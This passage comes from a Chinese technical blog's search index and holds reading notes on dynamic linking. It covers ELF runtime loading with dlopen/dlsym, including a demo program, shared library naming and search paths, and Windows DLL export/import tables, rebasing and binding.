principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"重定位和初始化 完成上述步骤，链接器开始重新遍历可执行文件和每个共享对象的重定位表，将它们的GOT/PLT中每个需要修正的位置进行修正。 重定位后，如果某个共享对象存在.init段，那么动态链接器就会执行.init段中的代码。可执行文件也有.init段不由动态链接器执行，它有程序初始化部分代码负责执行。 此时，动态链接器将进程的控制权转交给程序的入口并开始执行。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:12:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"显示运行时链接 支持动态链接的系统往往还支持另一种模块加载方式——显示运行时加载 (Explicit Run-time Linking)，又叫运行时加载。一般的共享对象不需要进行任何修改就可以搞这种方式，这种共享对象往往叫做动态装载库。 之前的共享对象的装载和链接都是由动态链接器在程序启动之前完成，而动态链接器的装载则是通过一系列动态链接器提供的API来完成。这里具体指四个函数：dlopen()、dlsym()、dlerror()和dlclose()。 下面关于这四个函数的叙述在man页中基本都能找到 man 3 {dlopen, dlsym, dlerror, dlclose} ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:13:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"dlopen() dlopen()函数用于打开一个动态库，并将其加载到进程的地址空间，完成初始化。 void *dlopen(const char *filename, int flags); 第一个参数时被加载动态库的路径，如果这个路径是绝对路径就直接开，如果是相对路径，dlopen()会尝试一定的顺序去查找该文件。 查找LD_LIBRARY_PATH环境变量指定的目录 查找/etc/ld.so.cache里面指定的路径 /lib、/usr/lib 如果filename的值为0，dlopen()将返回全局符号表的句柄。 第二个参数flag表示函数符号的解析方式，RTLD_LAZY表示延迟绑定，RTLD_NOW表示当模块被加载完时即完成所有的函数绑定工作，二者选其一。还有一些常量可以和前面两个搭配使用，像RTLD_GLOBAL表示将加载的模块的全局变量合并到进程的全局符号表中。 dlopen()的返回值时被加载模块的句柄，用于后续操作。如果加载失败则返回NULL，已加载返回的还是原先的句柄。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:13:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"dlsym() dlsym()函数是运行时装载的核心部分，用来找到所需的符号 void *dlsym(void *restrict handle, const char *restrict symbol); 第一个参数是dlopen()返回的句柄，第二个参数是要查找的符号的名字（一个以\\0结尾的C字符串）。如果dlsym()找到了相应的符号就会返回该符号的值，没有就是NULL。 如果符号是函数或者变量，返回的是地址；如果符号是常量，返回的是值。 为了防止常量值就是NULL或者0，还应该使用dlerror()函数判一手，如果该函数返回NULL就是符号找到了，没找到这个函数会返回相应的错误信息。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:13:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"dlerror() 每次调用dlopen()、dlsym()或dlclose()之后，都可以通过调用dlerror()来判断上一次调用是否成功。 成功返回NULL，不成功返回相应的错误信息。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:13:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"dlclose() dlclose()的作用和dlopen()相反，它的作用是将一个已加载的模块卸载。系统维持一个加载引用计数器，每次使用dlopen()加载某模块时，相应的计数器加一。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:13:4","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"运行时装载的演示程序 这里希望实现一个执行共享对象里的任意一个函数的程序，该程序的用法如下： $ ./runso \u003cshared object\u003e \u003cfunction\u003e [arg1] [arg2] ... \u003creturn type\u003e 因为x64函数调用约定的问题，我并没有想出一个比书中代码实现的更简单的办法，所以照抄了，GCC编译的时候带上-m32指定编译成32位的程序就行。实验用的共享对象也得搞成32位的。 #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cdlfcn.h\u003e #define SETUP_STACK \\ i = 2; \\ while (++i \u003c argc - 1) \\ { \\ switch (argv[i][0]) \\ { \\ case 'i': \\ asm volatile( \\ \"push %0\" :: \\ \"r\"(atoi(\u0026argv[i][1]))); \\ esp += 4; \\ break; \\ case 'd': \\ atoi(\u0026argv[i][1]); \\ asm volatile( \\ \"subl $8, %esp\\n\" \\ \"fstpl (%esp)\"); \\ esp += 8; \\ break; \\ case 's': \\ asm volatile( \\ \"push %0\" :: \\ \"r\"(\u0026argv[i][1])); \\ esp += 4; \\ break; \\ default: \\ printf(\"error argument type\\n\"); \\ goto exit_runso; \\ } \\ } \\ #define RESTORE_STACK \\ asm volatile(\"add %0, %%esp\\n\" :: \"r\"(esp)); \\ int main(int argc, char* argv[]){ void* handle; char* error; int i; int esp = 0; void* func; handle = dlopen(argv[1], RTLD_NOW); if(handle == 0){ printf(\"Can not find library: %s\\n\", argv[1]); return -1; } func = dlsym(handle, argv[2]); if((error = dlerror()) != NULL){ printf(\"Find symbol %s error:%s\\n\", argv[2], error); goto exit_runso; } switch (argv[argc-1][0]) { case 'i': int (*func_int)() = func; SETUP_STACK; int rati = func_int(); RESTORE_STACK; printf(\"ret = %d\\n\", rati); break; case 'd': double (*func_double)() = func; SETUP_STACK; double ratd = func_double(); RESTORE_STACK; printf(\"ret = %f\\n\", ratd); break; case 's': char* (*func_char)() = func; SETUP_STACK; char* ratc = func_char(); RESTORE_STACK; printf(\"ret = %s\\n\", ratc); break; case 'v': void (*func_void)() = func; SETUP_STACK; func_void(); printf(\"ret is anywhere \\n\"); break; default: break; } exit_runso: dlclose(handle); } 下面是本次实验中共享对象的源码 #include \u003cstdio.h\u003e int int_f(int a){ printf(\"You start me !!!\\n\"); printf (\"My type is int \\n\"); return a; } char* char_f(char* s){ printf(\"You start me !!!\\n\"); printf(\"My type is char*\\n\"); return s; } void void_f(){ printf(\"You start me !!!\\n\"); printf(\"My type is void\\n\"); } $ gcc -m32 runso.c -o runso $ gcc -shared -m32 hello.c -o hello.so $ ./runso ./hello.so char_f sssdwd s You start me !!! My type is char* ret = ssdwd $ ./runso ./hello.so int_f i123 i You start me !!! My type is int ret = 123 Linux共享库组织 从文件结构的角度来讲，共享库 (Shared Library)和共享对象没什么区别，Linux下的共享库就是普通的ELF共享对象。由于共享对象可以被多个程序共享，所以它就成为了库的存在形式，久而久之这俩概念已经模糊了，广义上可以堪称一个概念。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:13:5","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"共享库版本 共享库的文件命名规则如下 libname.so.x.y.z xyz从左到右，主版本号、次版本号、发布版本号。 主版本号表示库的重大升级，不同主版本号的库之间不兼容。 次版本号表示库的增量升级，即增加一些新的接口符号，且原有的不变。 发布版本号表示对库的一些错误的修正和性能的改进，不增加或修改新的接口。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:14:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"SO-NAME SO-NAME是共享库文件名去掉次版本号和发布版本号的结果，比如libfoo.so.3.5.9的SO-NAME就是libfoo.so.3。 系统会为这个文件创建一个软连接指向以SO-NAME命名的文件，这样在大方向不变的情况下可以保证次版本号和发布版本号最新。 程序的.dynamic中也无需把依赖的文件名写的太死，限制了自己。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:14:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"符号版本 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:15:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"基于符号的版本机制 Glibc从2.1开始支持基于符号的版本机制 (Symbol Versioning)。该机制的基本思想就是让每个导出和导入符号都有一个相关联的版本号，实际做法类似于符号修饰。 与以往简单地重命名共享库版本号不同，假设把libfoo.so.1.2升级到1.3时，保持libfoo.so.1这个SO-NAME，给1.3这个新版打一个标记，比如VERS1.3。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:15:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"共享库系统路径 FHS (File Hierarchy Standard)标准规定了Unix和类Unix系统的文件存放布局（系统文件该如何存放，各个目录的结构、组织和作用）。FHS规定，一个系统主要3个存放共享库的位置 /lib，这个位置存放系统最关键和基础的共享库，这些库主要为系统启动以及/bin和/sbin目录下的程序服务。 /usr/lib，这个目录存放非系统运行时需要的关键性的共享库。 /usr/local/lib，存放第三方应用程序的库 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:16:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"共享库查找过程 Linux系统都有一个叫做ldconfig的程序，这个程序的作用时为共享库目录下的各个共享库创建、删除或更新相应的SO-NAME。它还会将SO-NAME收集放到/etc/ld.so.cache文件中，建立SO-NAME缓存。动态链接器查找共享库时可以直接从这个特殊设计过的文件中查找，会加快共享库的查找过程。 其他的man页中有 man 1 ld The linker uses the following search paths to locate required shared libraries: 1. Any directories specified by -rpath-link options. 2. Any directories specified by -rpath options. The difference between -rpath and -rpath-link is that directories specified by -rpath options are included in the executable and used at runtime, whereas the -rpath-link option is only effective at link time. Searching -rpath in this way is only supported by native linkers and cross linkers which have been configured with the --with-sysroot option. 3. On an ELF system, for native linkers, if the -rpath and -rpath-link options were not used, search the contents of the environment variable \"LD_RUN_PATH\". 4. On SunOS, if the -rpath option was not used, search any directories specified using -L options. 5. For a native linker, search the contents of the environment variable \"LD_LIBRARY_PATH\". 6. For a native ELF linker, the directories in \"DT_RUNPATH\" or \"DT_RPATH\" of a shared library are searched for shared libraries needed by it. The \"DT_RPATH\" entries are ignored if \"DT_RUNPATH\" entries exist. 7. For a linker for a Linux system, if the file /etc/ld.so.conf exists, the list of directories found in that file. Note: the path to this file is prefixed with the \"sysroot\" value, if that is defined, and then any \"prefix\" string if the linker was configured with the --prefix=\u003cpath\u003e option. 8. For a native linker on a FreeBSD system, any directories specified by the \"_PATH_ELF_HINTS\" macro defined in the elf-hints.h header file. 9. Any directories specified by a \"SEARCH_DIR\" command in a linker script given on the command line, including scripts specified by -T (but not -dT). 10. The default directories, normally /lib and /usr/lib. 11. Any directories specified by a plugin LDPT_SET_EXTRA_LIBRARY_PATH. 12. Any directories specified by a \"SEARCH_DIR\" command in a default linker script. ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:17:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"共享库的创建和安装 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:18:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"共享库的创建 过程和创建共享对象差不多。 $ gcc -shared -Wl,-soname,\u003cname\u003e -o \u003clibrary_name\u003e \u003csource_files\u003e 不用-soname的话，共享库默认没有SO-NAME ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:18:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"清除符号信息 正常编译出来的会有对于最终发布版本无用的符号信息，去掉也可。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:18:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"共享库的安装 移动到指定目录，ldconfig一下即可。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:18:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"共享库构造和析构函数 GCC提供了一种共享库的构造和析构函数，在函数声明加上__attribute__((constructor))就是构造函数，在main()函数执行前执行，__attribute__((destructor))表明该函数在main()函数执行完毕后执行，或者说调用exit()时执行。 如果有多个构造函数，constructor(2)这样可以指定其优先级。对于构造函数来说数字越小优先级越大，对于析构函数来说正好相反。 Windows下的动态链接 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:18:4","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"DLL简介 DLL (Dynamic-Link Library)，相当于Linux下的共享对象。Windows系统中采用了大量的DLL，甚至Windows内核结构很大程度上也依赖于DLL机制。DLL和EXE文件都是PE格式的，区别在于PE文件头的头部中有个符号位表示其到底是啥。而DLL文件也未必得是.dll为后缀，.ocx、.CPL也可以。 Windows平台有大量的大型软件通过升级DLL的形式进行自我完善，微软经常将这些升级补丁积累到一定程度形成一个软件更新包。 ELF的动态链接可以实现运行时加载，Windows也有类似的技术。 在ELF中，共享库中所有的全局函数和变量在默认情况下都可以被其他模块使用，也就是说ELF默认导出所有的全局符号。DLL中需要显示地告诉编译器要导出某个符号，否则默认都不导出。 Microsoft Visual C++ (MSVC)编译器提供了一系列C/C++的扩展来指定符号的导入和导出，对于一些支持Windows平台的的编译器也都支持这种扩展。可以使用__declspec关键字修饰某个函数或变量，比如使用__declspec(dllexport)表示该符号是从本DLL导出的符号，__declspec(dllimport)表示该符号是从别的DLL导入的符号。 除了使用__declspec关键字之外，还可以使用.def文件声明导入导出符号。这个文件类似于.lds文件，可以当作link链接器的输入文件，用来控制链接器过程。.def文件中IMPORT和EXPORT可以用来声明导入导出符号。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:19:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"创建DLL __declspec(dllexport) double add(double a, double b) { return a + b; } __declspec(dllexport) double sub(double a, double b) { return a - b; } __declspec(dllexport) double mul(double a, double b) { return a * b; } 使用/LDd参数表示生成Debug版的DLL，/LD生成Release版的 $ CL /LDd .\\math.c 这条命令生成了math.dll、math.obj、math.exp和math.lib $ dumpbin /EXPORTS .\\math.dll Microsoft (R) COFF/PE Dumper Version 14.34.31937.0 Copyright (C) Microsoft Corporation. All rights reserved. Dump of file .\\math.dll File Type: DLL Section contains the following exports for math.dll 00000000 characteristics FFFFFFFF time date stamp 0.00 version 1 ordinal base 3 number of functions 3 number of names ordinal hint RVA name 1 0 00001000 add 2 1 00001040 mul 3 2 00001020 sub Summary 3000 .data 3000 .pdata 13000 .rdata 1000 .reloc 3C000 .text 1000 _RDATA 可以看到这个DLL有3个导出函数以及它们的RVA ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:19:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"使用DLL 对于其他DLL导入的符号，需要使用__declspec(dllimport)显示地声明某个符号为导入符号。 #include \u003cstdio.h\u003e __declspec(dllimport) double sub(double a, double b); int main(){ double result = sub(3.0, 2.0); printf(\"Result = %f\\n\", result); return 0; } $ CL /c .\\main.c $ link .\\main.obj .\\math.lib math.lib不真正包含math.c的代码和数据，它用来描述math.dll的导出符号，包含了main.obj链接math.dll所需要的导入符号和一部分“桩”代码。像math.lib这样的文件被称为导入库 (Import Library) ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:19:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"使用模块定义文件 将前面例子中math.c的__declspec扩展去掉，创建一个math.def文件，内容如下 LIBRARY math EXPORTS add sub mul CL .\\math.c /LD /DEF .\\math.def ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:19:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"DLL显示运行时链接 Windows提供了3个API： LoadLibrary （或LoadLibraryEx)，这个函数用来装载DLL到进程的地址空间 GetProcAddress，用来查找某个符号的地址 FreeLibrary，卸载某个已加载的模块 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:19:4","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"符号导出导入表 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:20:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"导出表 Windows PE中所有导出的符号被集中存放在了被称为导出表的结构中。 PE文件头中有一个叫做DataDirectory的结构数组，数组共有16个元素，每个元素保存一个地址和一个长度。它第一个元素就是导出表的结构的地址和长度。导出表是一个IMAGE_EXPORT_DIRECTORY的结构体，它被定义在winnt.h中 typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 导出表结构中，最后三个成员指向3个数组。这三个数组是导出表中最重要的结构——导出地址表 (EAT, Export Address Table)、符号名表 (Name Table)和名字序列对应表 (Name-Ordinal Table) 序号 (Ordinal) 早期内存很小的时候，内存中存放太多函数名太奢侈了，当时DLL的函数导出的主要方式是序号。一个导出符号的需要就是函数在EAT中的地址下标加上一个BASE值（IMAGE_EXPORT_DIRECTORY中的Base，默认为1）。 如果一个模块导入了某个函数，它在导入表中不保存函数名，而是保存函数的序号。序号-Base值就可以得到下标，然后就可以在EAT中找到RVA了。 但是在DLL中加减函数的话，序号就会发生变化，导致依赖它的程序出现一些问题。 现在的DLL不采用序号作为导入导出的手段，但是为了向后兼容，序号导出方式仍然被保留。 对于链接器来说，它在链接输出DLL时要知晓哪些函数和变量时要被导出的，除了之前介绍的方式，link链接器提供了/EXPORT参数用来指定导出符号 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:20:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"EXP文件 链接器创建DLL采用两边扫描过程 遍历所有的目标文件并收集所有的导出符号信息并且创建DLL的导出表。链接器将这个导出表放在一个临时的目标文件的.edata段中，这个目标文件就是EXP文件。 链接器将EXP文件当作普通目标文件和其他输入的目标文件链接在一起并且输出DLL。这时EXP的.edata段被传输到DLL文件中称为导出表。 EXP自然也是COFF/PE文件。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:20:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"导出重定向 DLL支持导出重定向 (Export Forwarding)机制。该机制就是将某个导出符号重定向到另一个DLL。调用a.dll的foo()函数相当于调用b.dll的bar()函数。 如果要重定向某个函数，可以使用模块定义文件 (DEF文件) EXPORTS \u003cfunction name\u003e = \u003cDLL name\u003e.\u003cfunction name\u003e 正常情况下，导入表的地址数组包含的是函数的RVA，但如果这个RVA指向的位置位于导出表中，那么表示这个符号被重定向了。被重定向了的符号的RVA不表示该函数的地址，而是指向一个ASCII字符串，这个字符串在导出表中，它是赴澳重定向后的DLL文件名和符号名，也就是等号右边这个东西，比如NTDLL.func ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:20:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"导入表 当某个PE文件被加载时，Windows加载器的其中一个任务就是将所有需要导入的函数地址确定并且将导入表中的元素调整到正确的地址，以实现动态链接的过程。 $ dumpbin /IMPORTS math.dll Microsoft (R) COFF/PE Dumper Version 14.34.31937.0 Copyright (C) Microsoft Corporation. All rights reserved. Dump of file math.dll File Type: DLL Section contains the following imports: KERNEL32.dll 18000F000 Import Address Table 180017D08 Import Name Table 0 time date stamp 0 Index of first forwarder reference 464 QueryPerformanceCounter 22B GetCurrentProcessId 22F GetCurrentThreadId 301 GetSystemTimeAsFileTime 381 InitializeSListHead 4E9 RtlCaptureContext 4F1 RtlLookupFunctionEntry 4F8 RtlVirtualUnwind 397 IsDebuggerPresent 5D8 UnhandledExceptionFilter 597 SetUnhandledExceptionFilter 2E8 GetStartupInfoW 39E IsProcessorFeaturePresent 28C GetModuleHandleW 8E CloseHandle 4F7 RtlUnwindEx 385 InterlockedFlushSList 274 GetLastError 557 SetLastError 141 EnterCriticalSection 3D6 LeaveCriticalSection 11B DeleteCriticalSection 37D InitializeCriticalSectionAndSpinCount 5C8 TlsAlloc 5CA TlsGetValue 5CB TlsSetValue 5C9 TlsFree 1BD FreeLibrary 2C4 GetProcAddress 3DC LoadLibraryExW 13D EncodePointer ... 可以看到math.dll从KERNEL32.dll导入了很多的函数，这是因为构建Windows DLL时，还链接了会用到KERNEL32.dll的支持DLL运行的基本运行库。 PE文件中，导入表是一个IMAGE_IMPORT_DESCRIPTOR的结构体数组，每一个IMAGE_IMPORT_DESCRIPTOR结构对应一个将被导入的DLL typedef struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; // 0 for terminating null import descriptor DWORD OriginalFirstThunk; // RVA to original unbound IAT (PIMAGE_THUNK_DATA) } DUMMYUNIONNAME; DWORD TimeDateStamp; // 0 if not bound, // -1 if bound, and real date\\time stamp // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND) // O.W. date/time stamp of DLL bound to (Old BIND) DWORD ForwarderChain; // -1 if no forwarders DWORD Name; DWORD FirstThunk; // RVA to IAT (if bound this IAT has actual addresses) } IMAGE_IMPORT_DESCRIPTOR; typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; 结构体中的FirstThunk指向一个导入地址数组 (Import Address Table)，IAT是导入表中最重要的结构，IAT中每个元素对应一个被导入的符号，元素的值在不同的情况下有不同的含义。在动态链接器刚完成映射还没有开始重定位和符号解析时，IAT中的元素表示相对于的导入符号的符号名或序号；当Windows的动态链接器完成该模块的链接时，元素值会被动态链接器改写成该符号的真正地址。通过元素的最高位来判断导入地址数组的元素中包含的是符号名还是序号。 在IMAGE_IMPORT_DESCRIPTOR结构中，还有一个指针OriginalFirstThunk指向一个叫做导入名称表 (INT, Import Name Table)的数组。 Windows的动态链接器在装载模块的时候会改写导入表的IAT。虽然PE的导入表是只读的，但因为Windows的动态链接器是Windows内核的一部分，所以可以在装载时把导入表所在的页面改成可读写，IAT被写完了再改回来。 延迟载入 当链接一个支持延迟载入的DLL时，链接器会产生和普通DLL类似但却会被操作系统忽略的数据。当延迟载入的API第一次被调用时，由链接器添加的特殊的桩代码会启动，这个代码负责对DLL的装载工作。桩代码通过调用GetProcAddress来找到被调用API的地址。MSVC还做了额外的优化，使得对该DLL的调用速度和普通方式载入的DLL的速度差不多。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:20:4","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"导入函数的调用 如果PE的模块需要调用一个导入函数，仿照ELF GOT机制的一个办法就是一个间接跳转指令 CALL DWORD PTR [0x0040D11C] 这条指令的含义是间接调用0x0040D11C地址中保存的地址，即从0x0040D11C开始取4个字节作为目标地址（DWORD PTR 表示4个字节的操作前缀），然后调用该目标地址。0x0040D11C这个地址刚好是IAT中的某一项，即需要调用的外部函数在IAT中所对应的元素，比如在之前的main.exe中就需要调用math.dll的sub()函数，那么0x0040D11C对应sub()导入函数在main.exe的IAT中的位置。该过程和GOT调转类似。 ELF通过在GOT调转前加了一层计算目标函数地址在GOT中的位置实现了地址无关，PE并没有，由此可见PE并不是地址无关。PE通过重定基地址的方法解决了装载时模块在进程空间中的地址冲突问题。 在__declspec关键字引入之前，微软提供了ing一种方法分辨一个函数是否是导入还是内部的。这种情况下，编译器同意产生直接调用的指令。链接器在连接时会将导入函数的目标地址导向一小段桩代码，由这这个代码将控制权交给IAT中真正的地址，实现如下 CALL 0x0040100C ... 0x0040100C: CALL DWORD PTR [0x0040D11C] 链接器一般不产生指令，这段指令来自产生DLL文件伴随的Lib文件，即导入库。 编译器产生导入库时，同一个导出函数会产生两个符号的定义。对于函数foo()来说，它在导入库中有两个符号，一个是foo，另一个是__imp__foo。前者指向foo函数的桩代码，后者指向foo函数在IAT中的位置。使用__declspec(import)关键字声明foo()导入函数时，编译器在链接时会在导入函数前加上前缀__imp__，和导入库的__imp__foo能够正常链接；如果不使用这个关键字，编译器会产生一个正常的foo符号引用，以便和导入库中的foo符号相链接。 现在MSVC编译器支持以上两种导入方式，但仅仅是不用写__declspec(dllimport)了而已，不写__declspec(dllexport)根本不产生导入库，好鸡儿鸡肋的样子。 到了Microsoft的文档，直接没说这个 从 DLL 导出 可使用两种方法从 DLL 导出函数： 创建模块定义 (.def) 文件，然后在生成 DLL 时使用 .def 文件。 如果希望按序号而不是按名称从 DLL 中导出函数，请使用此方法。 在函数定义中使用关键字 __declspec(dllexport)。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:20:5","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"DLL优化 DLL的代码段和数据段本身并不是和地址无关的，它默认需要被装载到ImageBase指定的目标地址中。如果目标地址被占用就需要装载到其他地址，便会引起整个DLL的Rebase。对于有大量DLL的程序来说，频繁的Rebase会造成程序的启动速度减慢。 动态链接过程中，导入函数的符号在运行时需要被逐个解析。解析过程中，免不了会涉及到符号字符串的查找。即使用了好的算法，量一大，这个过程也是非常耗时的。 这两个愿意可能会导致应用程序的速度非常慢，因为系统需要在启动程序时进行大量的符号解析和Rebase。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:21:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"重定基地址 Windows的PE采取一种和ELF不同的办法——装载时重定位。DLL模块装载时，如果目标地址被占用，那么操作系统就会为它分配一块新的空间，并且将DLL装载到新地址，并且所有涉及到绝对地址的引用都要进行重定位。当然这个重定位只需要加上一个值即可（目标装载地址和实际装载地址的差值）。 PE文件的重定位信息都放在了.reloc段，可以在PE文件头中的DataDirectory里面得到重定位段的信息。对于EXE文件来说，MSVC默认不产生重定位段，毕竟它时进程运行时第一个装入虚拟空间的。但DLL一般都会产生重定位信息，也可以用/FIXED参数禁止产生重定位信息。 但是如果一个DLL被多个进程共享，且该DLL被这些进程装载到不同的位置，那么每个进程都需要有一份单独的DLL代码段的副本。该方案相对于ELF共享对象地址无关的方案来说更浪费内存。Rebase的DLL代码段在被换出的时候需要被写到交换空间，而不像没有Rebase的DLL一样释放物理页面，再次用到直接从DLL文件重新读就行。但是它比ELF的PIC机制更快一些。 改变默认基址 对于一个程序来说，它所用到的DLL基本是固定的，装载顺序和地址也是一样的。 MSVC提供了指定输出文件的基地址的功能，link链接时使用/BASE参数可以指定基地址。MSVC还提供了editbin可以用来改变已有DLL的基地址。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:21:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"序号 def文件可以定义导出符号的序号和函数名是否可见。 LIBRARY math add @1 NONAME ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:21:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"导入函数绑定 大多数情况下，DLL会以和之前一样的顺序被装载到和之前一样的地址。这就带来一个DLL性能优化方式——DLL绑定 (DLL Binding)。 editbin /BIND main.exe DLL的绑定实现也比较简单，editbin对程序的导入符号进行遍历查找，找到后就把符号的运行时的地址写到导入表内。之前介绍导入表中的INT就是干这个的。 绑定地址失效： DLL更新，导致导出函数地址发生变化 DLL在装载的时候Rebase，导致装载地址和绑定的不一样 PE的解决办法：链接器在程序绑定时对每个DLL的时间戳 (Timestamp)和校验和 (Checksum，比如MD5)保存到导入表中。运行时Windows核对DLL和登记信息是否能对上并确认其是否Rebase，发生变化就进行对DLL的符号解析。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:21:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"关于 普通本科 大三在读 在一个应该算是科班的地方里学习的野路子 学校菜菜 我也菜菜 🫡 算是一个操作系统爱好者 😗 INTJ 🤔 开发环境: Fedora Silverblue \u0026\u0026 Windows 11 双系统 Neovim/Visual Studio Code 编程语言: C/C++ Python/Shell Java/C# ? ","date":"0001-01-01","objectID":"/about/:1:0","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"Task 刷课 MIT 6.1810: Operating System Engineering 6.1810 NJU OS: Operating System Design and Implementation 操作系统：设计与实现 (2024 春季学期) Stanford CS162: Operating System CS 162: Operating Systems and System Programming Welcome to Pintos Stanford CS106L: Standard C++ Programming CS106L: Standard C++ Programming Stanford CS144: Computer Network CS 144: Introduction to Computer Networking, PKU 编译原理实践 北大编译实践在线文档 ASU CSE466: Computer 